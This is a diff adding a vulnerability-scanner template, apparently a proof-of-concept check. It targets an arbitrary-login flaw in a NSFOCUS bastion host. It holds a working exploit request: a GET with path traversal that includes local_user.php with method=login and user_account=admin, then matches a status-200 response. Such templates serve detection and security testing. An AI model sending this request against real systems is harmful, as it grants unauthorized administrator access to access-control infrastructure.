@@ -1,0 +1,12 @@
+name: 绿盟-堡垒机-local_user.php任意登录
+description: >-
+  任意登录
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
+    expression:
+      status: 200
+      body_all:
+        - "status\":\"200"
